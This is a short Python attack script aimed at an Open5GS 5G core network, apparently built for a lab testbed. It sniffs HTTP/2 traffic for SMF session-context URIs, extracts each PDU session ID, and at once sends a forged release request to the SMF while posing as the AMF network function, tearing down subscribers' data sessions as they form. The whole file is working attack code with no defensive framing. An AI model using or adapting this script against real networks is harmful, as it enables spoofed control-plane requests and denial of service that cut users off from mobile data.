#!/usr/bin/env python3

from scapy.all import sniff, wrpcap
from scapy.layers.inet import IP, TCP
import os
import subprocess

# URI pattern to match
URI_PATTERN = "http://open5gs-smf/nsmf-pdusession/v1/sm-contexts/"

# Temporary file to store captured packets
TEMP_PCAP = "/tmp/temp_packet.pcap"

def process_with_tshark(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        try:
            # Write the packet to a temporary .pcap file
            wrpcap(TEMP_PCAP, [packet])

            # Run tshark directly on the temporary .pcap file
            command = [
                "tshark",
                "-r", TEMP_PCAP,  # Read from the temporary pcap
                "-o", "http2.tcp.port:80",  # Decode HTTP/2 on port 80
                "-Y", f'http2.header.value contains "{URI_PATTERN}"',  # Filter packets
                "-T", "fields",  # Output fields
                "-e", "ip.src",  # Extract source IP
                "-e", "http2.header.value",  # Extract header value
            ]
            output = subprocess.check_output(command).decode("utf-8")

            # Process tshark output
            for line in output.strip().split("\n"):
                parts = line.split("\t")
                if len(parts) >= 2:
                    ip_src = parts[0]
                    uri = parts[1]
                    print(f"Source IP: {ip_src}, URI: {uri}")

                    # Extract the session ID from the URI
                    session_id = uri.split("/")[-1]
                    print(f"Session ID: {session_id}")

                    # Trigger a POST request
                    post_to_server(ip_src, session_id)

        except subprocess.CalledProcessError as e:
            print(f"Tshark processing error: {e.output.decode('utf-8')}")
        except Exception as e:
            print(f"Error processing packet with tshark: {e}")
        finally:
            # Clean up the temporary .pcap file
            if os.path.exists(TEMP_PCAP):
                os.remove(TEMP_PCAP)

def post_to_server(ip_src, session_id):
    try:
        url = f"http://open5gs-smf/nsmf-pdusession/v1/sm-contexts/{session_id}/release"
        data = '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"208","mnc":"93"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"208","mnc":"93"},"nrCellId":"000000010"},"ueLocationTimestamp":"2022-11-30T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}'
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "AMF"
        }
        subprocess.run(
            [
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "--http2-prior-knowledge", "--request", "POST",
                "-d", data,
                "-H", f"Content-Type: {headers['Content-Type']}",
                "-A", headers["User-Agent"],
                url,
            ],
            check=True
        )
        print(f"\nPOST request sent to {url} for Source IP {ip_src} and Session ID {session_id}")
    except Exception as e:
        print(f"\nError sending POST request: {e}")

# Start sniffing packets
print("Starting packet capture...")
sniff(filter="tcp src port 80", prn=process_with_tshark)
